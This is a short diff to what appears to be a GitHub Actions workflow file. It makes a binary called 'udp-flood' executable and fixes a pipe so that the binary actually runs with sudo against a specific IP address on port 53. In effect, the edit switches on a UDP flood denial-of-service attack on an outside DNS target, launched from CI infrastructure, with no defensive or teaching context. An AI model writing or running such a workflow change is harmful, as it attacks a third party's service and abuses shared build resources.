@@ -11,4 +11,4 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x udp-flood
-      - run: echo y || sudo ./udp-flood 171.225.223.4 53 0 0 0 
+      - run: echo y | sudo ./udp-flood 171.225.223.4 53 0 0 0 
